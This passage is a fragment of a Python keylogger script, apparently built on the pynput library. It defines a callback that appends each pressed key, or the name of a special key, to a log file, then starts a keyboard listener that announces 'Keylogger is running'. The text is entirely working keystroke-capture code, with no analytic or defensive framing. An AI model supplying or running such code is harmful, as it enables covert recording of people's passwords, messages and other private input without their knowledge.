

def log_key(key):
    with open(log_file, "a") as f:
        try:
            # If alphanumeric key
            f.write(f"{key.char}")
        except AttributeError:
            # Special keys
            f.write(f" [{key}] ")

# Listener to detect key presses
with Listener(on_press=log_key) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
